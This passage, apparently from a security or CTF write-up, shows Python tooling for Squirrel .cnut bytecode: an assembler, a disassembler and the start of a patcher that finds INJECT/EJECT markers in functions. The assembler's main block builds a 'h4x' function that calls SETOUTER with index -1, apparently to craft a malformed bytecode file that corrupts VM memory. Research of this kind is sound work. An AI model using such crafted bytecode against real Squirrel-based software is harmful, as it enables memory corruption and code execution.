                self<span class="token punctuation">.</span>write<span class="token punctuation">(</span>struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">&apos;B&apos;</span><span class="token punctuation">,</span>data<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                self<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">b&apos;\x00&apos;</span><span class="token punctuation">)</span>

        self<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">b&apos;TRAP&apos;</span><span class="token punctuation">)</span>

        <span class="token keyword">for</span> x <span class="token keyword">in</span> fun<span class="token punctuation">.</span>functions<span class="token punctuation">:</span>
            self<span class="token punctuation">.</span>write_function<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
        
        self<span class="token punctuation">.</span>write<span class="token punctuation">(</span>struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">&quot;q&quot;</span><span class="token punctuation">,</span>fun<span class="token punctuation">.</span>stack_size<span class="token punctuation">)</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>write<span class="token punctuation">(</span>struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">&quot;B&quot;</span><span class="token punctuation">,</span><span class="token number">1</span> <span class="token keyword">if</span> fun<span class="token punctuation">.</span>is_generator <span class="token keyword">else</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>write<span class="token punctuation">(</span>struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">&quot;Q&quot;</span><span class="token punctuation">,</span>fun<span class="token punctuation">.</span>var_params<span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">write1</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>val<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>pos<span class="token operator">+=</span><span class="token number">1</span>
        self<span class="token punctuation">.</span>data<span class="token operator">+=</span>val


    <span class="token keyword">def</span> <span class="token function">write</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>pos<span class="token operator">+=</span><span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>data<span class="token operator">+=</span> data 
    
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">&quot;__main__&quot;</span><span class="token punctuation">:</span>
    assembly<span class="token operator">=</span><span class="token triple-quoted-string string">&quot;&quot;&quot;
    LOADNULLS a0: 0x00 a1: 0x01 a2: 0x00 a3: 0x00
    LOADINT   a0: 0x01 a1: 0x41 a2: 0x00 a3: 0x00
    SETOUTER  a0: 0x01 a1: %x   a2: 0x01 a3: 0x00
    &quot;&quot;&quot;</span><span class="token operator">%</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
    s <span class="token operator">=</span> SQFile<span class="token punctuation">(</span><span class="token punctuation">)</span>
    t <span class="token operator">=</span> tmap<span class="token punctuation">[</span><span class="token string">&apos;OT_NATIVECLOSURE&apos;</span><span class="token punctuation">]</span>
    main <span class="token operator">=</span> SQFunction<span class="token punctuation">(</span><span class="token string">&quot;h4x&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;name&quot;</span><span class="token punctuation">,</span>var_params<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>stack_size<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">,</span>instructions<span class="token operator">=</span>parse_assembly<span class="token punctuation">(</span>assembly<span class="token punctuation">)</span><span class="token punctuation">,</span>literals<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

    s<span class="token punctuation">.</span>assemble<span class="token punctuation">(</span>main<span class="token punctuation">)</span>
    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">&quot;test.cnut&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;wb&quot;</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>s<span class="token punctuation">.</span>data<span class="token punctuation">)</span>
</pre><p><strong>disassembler:</strong></p>
<pre data-role="codeBlock" data-info="py" class="language-python"><span class="token keyword">import</span> struct

<span class="token keyword">from</span> sqdef <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> common <span class="token keyword">import</span> <span class="token operator">*</span>

<span class="token keyword">class</span> <span class="token class-name">SQFile</span><span class="token punctuation">:</span>

    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>data <span class="token operator">=</span> data
        self<span class="token punctuation">.</span>pos <span class="token operator">=</span> <span class="token number">0</span>
        self<span class="token punctuation">.</span>main <span class="token operator">=</span> <span class="token boolean">None</span>

    <span class="token keyword">def</span> <span class="token function">parse</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        magic <span class="token operator">=</span> self<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
        <span class="token keyword">assert</span><span class="token punctuation">(</span>magic <span class="token operator">==</span> <span class="token string">b&apos;\xFA\xFA&apos;</span><span class="token punctuation">)</span>
        head <span class="token operator">=</span> self<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
        <span class="token keyword">assert</span><span class="token punctuation">(</span>head <span class="token operator">==</span> <span class="token string">b&apos;RIQS&apos;</span><span class="token punctuation">)</span>
        <span class="token punctuation">[</span>sz_sqchar<span class="token punctuation">]</span> <span class="token operator">=</span> struct<span class="token punctuation">.</span>unpack<span class="token punctuation">(</span><span class="token string">&quot;I&quot;</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">assert</span><span class="token punctuation">(</span>sz_sqchar <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span>
        <span class="token punctuation">[</span>sz_sqint<span class="token punctuation">]</span> <span class="token operator">=</span> struct<span class="token punctuation">.</span>unpack<span class="token punctuation">(</span><span class="token string">&quot;I&quot;</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">assert</span><span class="token punctuation">(</span>sz_sqint <span class="token operator">==</span> <span class="token number">8</span><span class="token punctuation">)</span>
        <span class="token punctuation">[</span>sz_sqfloat<span class="token punctuation">]</span> <span class="token operator">=</span> struct<span class="token punctuation">.</span>unpack<span class="token punctuation">(</span><span class="token string">&quot;I&quot;</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">assert</span><span class="token punctuation">(</span>sz_sqfloat <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>main <span class="token operator">=</span> self<span class="token punctuation">.</span>parse_function<span class="token punctuation">(</span><span class="token punctuation">)</span>
        tail <span class="token operator">=</span> self<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
        <span class="token keyword">assert</span><span class="token punctuation">(</span>tail <span class="token operator">==</span> <span class="token string">b&apos;LIAT&apos;</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">parse_object</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token punctuation">[</span>t<span class="token punctuation">]</span> <span class="token operator">=</span> struct<span class="token punctuation">.</span>unpack<span class="token punctuation">(</span><span class="token string">&quot;I&quot;</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> t <span class="token operator">==</span> tmap<span class="token punctuation">[</span><span class="token string">&apos;OT_STRING&apos;</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
            <span class="token punctuation">[</span>v<span class="token punctuation">]</span> <span class="token operator">=</span> struct<span class="token punctuation">.</span>unpack<span class="token punctuation">(</span><span class="token string">&quot;Q&quot;</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> <span class="token punctuation">(</span>t<span class="token punctuation">,</span>self<span class="token punctuation">.</span>read<span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">elif</span> t <span class="token operator">==</span> tmap<span class="token punctuation">[</span><span class="token string">&apos;OT_INTEGER&apos;</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
            <span class="token punctuation">[</span>v<span class="token punctuation">]</span> <span class="token operator">=</span> struct<span class="token punctuation">.</span>unpack<span class="token punctuation">(</span><span class="token string">&quot;Q&quot;</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> <span class="token punctuation">(</span>t<span class="token punctuation">,</span>v<span class="token punctuation">)</span>
        <span class="token keyword">elif</span> t <span class="token operator">==</span> tmap<span class="token punctuation">[</span><span class="token string">&apos;OT_BOOL&apos;</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
            <span class="token punctuation">[</span>v<span class="token punctuation">]</span> <span class="token operator">=</span> struct<span class="token punctuation">.</span>unpack<span class="token punctuation">(</span><span class="token string">&quot;Q&quot;</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> <span class="token punctuation">(</span>t<span class="token punctuation">,</span>v <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
        <span class="token keyword">elif</span> t <span class="token operator">==</span> tmap<span class="token punctuation">[</span><span class="token string">&apos;OT_FLOAT&apos;</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
            <span class="token punctuation">[</span>v<span class="token punctuation">]</span> <span class="token operator">=</span> struct<span class="token punctuation">.</span>unpack<span class="token punctuation">(</span><span class="token string">&quot;f&quot;</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> <span class="token punctuation">(</span>t<span class="token punctuation">,</span>v<span class="token punctuation">)</span>
        <span class="token keyword">elif</span> t <span class="token operator">==</span> tmap<span class="token punctuation">[</span><span class="token string">&apos;OT_NULL&apos;</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token punctuation">(</span>t<span class="token punctuation">,</span><span class="token boolean">None</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">parse_function</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        part <span class="token operator">=</span> self<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
        <span class="token keyword">assert</span><span class="token punctuation">(</span>part <span class="token operator">==</span> <span class="token string">b&apos;TRAP&apos;</span><span class="token punctuation">)</span>
        sourcename <span class="token operator">=</span> self<span class="token punctuation">.</span>parse_object<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
        function_name <span class="token operator">=</span> self<span class="token punctuation">.</span>parse_object<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
        part <span class="token operator">=</span> self<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
        <span class="token keyword">assert</span><span class="token punctuation">(</span>part <span class="token operator">==</span> <span class="token string">b&apos;TRAP&apos;</span><span class="token punctuation">)</span>

        <span class="token punctuation">[</span>n_literals<span class="token punctuation">]</span> <span class="token operator">=</span> struct<span class="token punctuation">.</span>unpack<span class="token punctuation">(</span><span class="token string">&quot;Q&quot;</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">[</span>n_parameters<span class="token punctuation">]</span> <span class="token operator">=</span> struct<span class="token punctuation">.</span>unpack<span class="token punctuation">(</span><span class="token string">&quot;Q&quot;</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">[</span>n_outervalues<span class="token punctuation">]</span> <span class="token operator">=</span> struct<span class="token punctuation">.</span>unpack<span class="token punctuation">(</span><span class="token string">&quot;Q&quot;</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">[</span>n_localvarinfos<span class="token punctuation">]</span> <span class="token operator">=</span> struct<span class="token punctuation">.</span>unpack<span class="token punctuation">(</span><span class="token string">&quot;Q&quot;</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">[</span>n_lineinfos<span class="token punctuation">]</span> <span class="token operator">=</span> struct<span class="token punctuation">.</span>unpack<span class="token punctuation">(</span><span class="token string">&quot;Q&quot;</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">[</span>n_defaultparams<span class="token punctuation">]</span> <span class="token operator">=</span> struct<span class="token punctuation">.</span>unpack<span class="token punctuation">(</span><span class="token string">&quot;Q&quot;</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">[</span>n_instructions<span class="token punctuation">]</span> <span class="token operator">=</span> struct<span class="token punctuation">.</span>unpack<span class="token punctuation">(</span><span class="token string">&quot;Q&quot;</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">[</span>n_functions<span class="token punctuation">]</span> <span class="token operator">=</span> struct<span class="token punctuation">.</span>unpack<span class="token punctuation">(</span><span class="token string">&quot;Q&quot;</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

        part <span class="token operator">=</span> self<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
        <span class="token keyword">assert</span><span class="token punctuation">(</span>part <span class="token operator">==</span> <span class="token string">b&apos;TRAP&apos;</span><span class="token punctuation">)</span>

        literals <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
        <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n_literals<span class="token punctuation">)</span><span class="token punctuation">:</span>
            literals<span class="token punctuation">.</span>append<span class="token punctuation">(</span>self<span class="token punctuation">.</span>parse_object<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

        part <span class="token operator">=</span> self<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
        <span class="token keyword">assert</span><span class="token punctuation">(</span>part <span class="token operator">==</span> <span class="token string">b&apos;TRAP&apos;</span><span class="token punctuation">)</span>

        parameters <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
        <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n_parameters<span class="token punctuation">)</span><span class="token punctuation">:</span>
            parameters<span class="token punctuation">.</span>append<span class="token punctuation">(</span>self<span class="token punctuation">.</span>parse_object<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

        part <span class="token operator">=</span> self<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
        <span class="token keyword">assert</span><span class="token punctuation">(</span>part <span class="token operator">==</span> <span class="token string">b&apos;TRAP&apos;</span><span class="token punctuation">)</span>

        outervalues <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
        <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n_outervalues<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token punctuation">[</span>t<span class="token punctuation">]</span> <span class="token operator">=</span> struct<span class="token punctuation">.</span>unpack<span class="token punctuation">(</span><span class="token string">&quot;Q&quot;</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            o <span class="token operator">=</span> self<span class="token punctuation">.</span>parse_object<span class="token punctuation">(</span><span class="token punctuation">)</span>
            name <span class="token operator">=</span> self<span class="token punctuation">.</span>parse_object<span class="token punctuation">(</span><span class="token punctuation">)</span>
            outervalues<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> o<span class="token punctuation">,</span> t<span class="token punctuation">)</span><span class="token punctuation">)</span>

        part <span class="token operator">=</span> self<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
        <span class="token keyword">assert</span><span class="token punctuation">(</span>part <span class="token operator">==</span> <span class="token string">b&apos;TRAP&apos;</span><span class="token punctuation">)</span>

        localvarinfos <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
        <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n_localvarinfos<span class="token punctuation">)</span><span class="token punctuation">:</span>
            name <span class="token operator">=</span> self<span class="token punctuation">.</span>parse_object<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token punctuation">[</span>pos<span class="token punctuation">,</span> start<span class="token punctuation">,</span> end<span class="token punctuation">]</span> <span class="token operator">=</span> struct<span class="token punctuation">.</span>unpack<span class="token punctuation">(</span><span class="token string">&quot;QQQ&quot;</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">8</span><span class="token operator">*</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            localvarinfos<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> pos<span class="token punctuation">,</span> start<span class="token punctuation">,</span> end<span class="token punctuation">)</span><span class="token punctuation">)</span>

        part <span class="token operator">=</span> self<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
        <span class="token keyword">assert</span><span class="token punctuation">(</span>part <span class="token operator">==</span> <span class="token string">b&apos;TRAP&apos;</span><span class="token punctuation">)</span>

        lineinfos <span class="token operator">=</span> self<span class="token punctuation">.</span>read<span class="token punctuation">(</span>n_lineinfos<span class="token operator">*</span><span class="token number">16</span><span class="token punctuation">)</span>

        part <span class="token operator">=</span> self<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
        <span class="token keyword">assert</span><span class="token punctuation">(</span>part <span class="token operator">==</span> <span class="token string">b&apos;TRAP&apos;</span><span class="token punctuation">)</span>

        defaultparams <span class="token operator">=</span> self<span class="token punctuation">.</span>read<span class="token punctuation">(</span>n_defaultparams<span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>

        part <span class="token operator">=</span> self<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
        <span class="token keyword">assert</span><span class="token punctuation">(</span>part <span class="token operator">==</span> <span class="token string">b&apos;TRAP&apos;</span><span class="token punctuation">)</span>

        instructions <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n_instructions<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token punctuation">[</span>arg1<span class="token punctuation">,</span> op<span class="token punctuation">,</span> arg0<span class="token punctuation">,</span> arg2<span class="token punctuation">,</span> arg3<span class="token punctuation">]</span> <span class="token operator">=</span> struct<span class="token punctuation">.</span>unpack<span class="token punctuation">(</span><span class="token string">&quot;iBBBB&quot;</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            ins <span class="token operator">=</span> SQInstruction<span class="token punctuation">(</span>op<span class="token punctuation">,</span> arg0<span class="token punctuation">,</span> arg1<span class="token punctuation">,</span> arg2<span class="token punctuation">,</span> arg3<span class="token punctuation">)</span>
            instructions<span class="token punctuation">.</span>append<span class="token punctuation">(</span>ins<span class="token punctuation">)</span>


        part <span class="token operator">=</span> self<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
        <span class="token keyword">assert</span><span class="token punctuation">(</span>part <span class="token operator">==</span> <span class="token string">b&apos;TRAP&apos;</span><span class="token punctuation">)</span>

        functions <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
        <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n_functions<span class="token punctuation">)</span><span class="token punctuation">:</span>
            functions<span class="token punctuation">.</span>append<span class="token punctuation">(</span>self<span class="token punctuation">.</span>parse_function<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

        <span class="token punctuation">[</span>stack_size<span class="token punctuation">]</span> <span class="token operator">=</span> struct<span class="token punctuation">.</span>unpack<span class="token punctuation">(</span><span class="token string">&quot;Q&quot;</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">[</span>is_generator<span class="token punctuation">]</span> <span class="token operator">=</span> struct<span class="token punctuation">.</span>unpack<span class="token punctuation">(</span><span class="token string">&quot;B&quot;</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">[</span>var_params<span class="token punctuation">]</span> <span class="token operator">=</span> struct<span class="token punctuation">.</span>unpack<span class="token punctuation">(</span><span class="token string">&quot;Q&quot;</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

        <span class="token keyword">return</span> SQFunction<span class="token punctuation">(</span>sourcename<span class="token punctuation">,</span>function_name<span class="token punctuation">,</span>literals<span class="token punctuation">,</span>parameters<span class="token punctuation">,</span>outervalues<span class="token punctuation">,</span>localvarinfos<span class="token punctuation">,</span>lineinfos<span class="token punctuation">,</span>defaultparams<span class="token punctuation">,</span>instructions<span class="token punctuation">,</span>functions<span class="token punctuation">,</span>stack_size<span class="token punctuation">,</span>is_generator<span class="token punctuation">,</span>var_params<span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">read</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>
        b <span class="token operator">=</span> self<span class="token punctuation">.</span>pos<span class="token operator">+</span>n
        data <span class="token operator">=</span> self<span class="token punctuation">.</span>data<span class="token punctuation">[</span>self<span class="token punctuation">.</span>pos<span class="token punctuation">:</span>b<span class="token punctuation">]</span>
        self<span class="token punctuation">.</span>pos <span class="token operator">=</span> b
        <span class="token keyword">return</span> data

    <span class="token keyword">def</span> <span class="token function">__repr__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">&quot;%r&quot;</span> <span class="token operator">%</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>main<span class="token punctuation">)</span>

    


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">&quot;__main__&quot;</span><span class="token punctuation">:</span>
    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">&quot;test.cnut&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;rb&quot;</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
        data <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>

    f <span class="token operator">=</span> SQFile<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
    f<span class="token punctuation">.</span>parse<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;%r&quot;</span> <span class="token operator">%</span> <span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">)</span>

</pre><p><strong>patcher:</strong></p>
<pre data-role="codeBlock" data-info="py" class="language-python"><span class="token keyword">import</span> assembler <span class="token keyword">as</span> asm
<span class="token keyword">import</span> disassembler <span class="token keyword">as</span> dism
<span class="token keyword">from</span> sqdef <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> struct
<span class="token keyword">import</span> os

DEBUG <span class="token operator">=</span> <span class="token boolean">True</span>
step <span class="token operator">=</span> <span class="token number">40</span>

<span class="token keyword">def</span> <span class="token function">get_fn</span><span class="token punctuation">(</span>base<span class="token punctuation">,</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> base<span class="token punctuation">.</span>function_name <span class="token operator">==</span> name<span class="token punctuation">:</span>
        <span class="token keyword">return</span> base
    <span class="token keyword">for</span> fn <span class="token keyword">in</span> base<span class="token punctuation">.</span>functions<span class="token punctuation">:</span>
        f <span class="token operator">=</span> get_fn<span class="token punctuation">(</span>fn<span class="token punctuation">,</span>name<span class="token punctuation">)</span>
        <span class="token keyword">if</span> f<span class="token punctuation">:</span>
            <span class="token keyword">return</span> f
    <span class="token keyword">return</span> <span class="token boolean">None</span>

<span class="token keyword">def</span> <span class="token function">r_apply</span><span class="token punctuation">(</span>base<span class="token punctuation">,</span>fn<span class="token punctuation">)</span><span class="token punctuation">:</span>
    fn<span class="token punctuation">(</span>base<span class="token punctuation">)</span>
    <span class="token keyword">for</span> f <span class="token keyword">in</span> base<span class="token punctuation">.</span>functions<span class="token punctuation">:</span>
        r_apply<span class="token punctuation">(</span>f<span class="token punctuation">,</span>fn<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">split_injection</span><span class="token punctuation">(</span>fn<span class="token punctuation">)</span><span class="token punctuation">:</span>
    inj_idx <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span>
    ej_idx <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span>
    <span class="token keyword">for</span> idx<span class="token punctuation">,</span> ins <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>fn<span class="token punctuation">.</span>instructions<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> op2name<span class="token punctuation">[</span>ins<span class="token punctuation">.</span>op<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">&quot;LOAD&quot;</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> fn<span class="token punctuation">.</span>literals<span class="token punctuation">[</span>ins<span class="token punctuation">.</span>arg1<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token punctuation">(</span>tmap<span class="token punctuation">[</span><span class="token string">&apos;OT_STRING&apos;</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">&quot;INJECT&quot;</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                inj_idx <span class="token operator">=</span> idx
            <span class="token keyword">elif</span> fn<span class="token punctuation">.</span>literals<span class="token punctuation">[</span>ins<span class="token punctuation">.</span>arg1<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token punctuation">(</span>tmap<span class="token punctuation">[</span><span class="token string">&apos;OT_STRING&apos;</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">&quot;EJECT&quot;</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                ej_idx <span class="token operator">=</span> idx
    <span class="token keyword">if</span> inj_idx <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">or</span> ej_idx <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span>
